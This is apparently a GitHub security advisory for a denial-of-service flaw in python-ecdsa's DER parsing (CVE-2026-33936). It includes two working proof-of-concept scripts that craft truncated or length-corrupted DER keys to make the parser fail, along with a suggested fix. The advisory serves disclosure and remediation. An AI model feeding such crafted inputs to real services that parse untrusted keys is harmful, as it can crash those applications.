# [M] python-ecdsa: Denial of Service via improper DER length validation in crafted private keys

## Summary
Severity: Medium
Advisory: GHSA-9f5j-8jwj-x28g
CVE: CVE-2026-33936
CWE: CWE-130, CWE-20
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L (CVSS_V3)
Published: 2026-03-27
Source: https://github.com/advisories/GHSA-9f5j-8jwj-x28g
Type: github-advisory

## Affected
- PyPI: `ecdsa` — affected >=0 <0.19.2

## Details
## Summary

An issue in the low-level DER parsing functions can cause unexpected exceptions to be raised from the public API functions.

1. `ecdsa.der.remove_octet_string()` accepts truncated DER where the encoded length exceeds the available buffer. For example, an OCTET STRING that declares a length of 4096 bytes but provides only 3 bytes is parsed successfully instead of being rejected.

2. Because of that, a crafted DER input can cause `SigningKey.from_der()` to raise an internal exception (`IndexError: index out of bounds on dimension 1`) rather than cleanly rejecting malformed DER (e.g., raising `UnexpectedDER` or `ValueError`). Applications that parse untrusted DER private keys may crash if they do not handle unexpected exceptions, resulting in a denial of service.

## Impact

Potential denial-of-service when parsing untrusted DER private keys due to unexpected internal exceptions, and malformed DER acceptance due to missing bounds checks in DER helper functions.

## Reproduction

Attach and run the following PoCs:

###  poc_truncated_der_octet.py

```python
from ecdsa.der import remove_octet_string, UnexpectedDER

# OCTET STRING (0x04)
# Declared length: 0x82 0x10 0x00  -> 4096 bytes
# Actual body: only 3 bytes -> truncated DER
bad = b"\x04\x82\x10\x00" + b"ABC"

try:
    body, rest = remove_octet_string(bad)
    print("[BUG] remove_octet_string accepted truncated DER.")
    print("Declared length=4096, actual body_len=", len(body), "rest_len=", len(rest))
    print("Body=", body)
    print("Rest=", rest)
except UnexpectedDER as e:
    print("[OK] Rejected malformed DER:", e)
```

- Expected: reject malformed DER when declared length exceeds available bytes
- Actual: accepts the truncated DER and returns a shorter body
- Example output:
```
Parsed body_len= 3 rest_len= 0 (while declared length is 4096)
```

### poc_signingkey_from_der_indexerror.py

```python
from ecdsa import SigningKey, NIST256p
import ecdsa

print("ecdsa version:", ecdsa.__version__)

sk = SigningKey.generate(curve=NIST256p)
good = sk.to_der()
print("Good DER len:", len(good))


def find_crashing_mutation(data: bytes):
    b = bytearray(data)

    # Try every OCTET STRING tag position and corrupt a short-form length byte
    for i in range(len(b) - 4):
        if b[i] != 0x04:  # OCTET STRING tag
            continue

        L = b[i + 1]
        if L >= 0x80:
            # skip long-form lengths for simplicity
            continue

        max_possible = len(b) - (i + 2)
        if max_possible <= 10:
            continue

        # Claim more bytes than exist -> truncation
        newL = min(0x7F, max_possible + 20)
        b2 = bytearray(b)
        b2[i + 1] = newL

        try:
            SigningKey.from_der(bytes(b2))
        except Exception as e:
            return i, type(e).__name__, str(e)

    return None


res = find_crashing_mutation(good)
if res is None:
    print("[INFO] No exception triggered by this mutation strategy.")
else:
    i, etype, msg = res
    print("[BUG] SigningKey.from_der raised unexpected exception type.")
    print("Offset:", i, "Exception:", etype, "Message:", msg)
```

- Expected: reject malformed DER with `UnexpectedDER` or `ValueError`
- Actual: deterministically triggers an internal `IndexError` (DoS risk)
- Example output:
```
Result: (5, 'IndexError', 'index out of bounds on dimension 1')
```

## Suggested fix

Add “declared length must fit buffer” checks in DER helper functions similarly to the existing check in `remove_sequence()`:

- `remove_octet_string()`
- `remove_constructed()`
- `remove_implicit()`

Additionally, consider catching unexpected internal exceptions in DER key parsing paths and re-raising them as `UnexpectedDER` to avoid crashy failure modes.

## Credit

Mohamed Abdelaal (@0xmrma)

## References
- https://github.com/tlsfuzzer/python-ecdsa/security/advisories/GHSA-9f5j-8jwj-x28g
- https://nvd.nist.gov/vuln/detail/CVE-2026-33936
- https://github.com/tlsfuzzer/python-ecdsa/commit/bd66899550d7185939bf27b75713a2ac9325a9d3
- https://github.com/tlsfuzzer/python-ecdsa
- https://github.com/tlsfuzzer/python-ecdsa/releases/tag/python-ecdsa-0.19.2
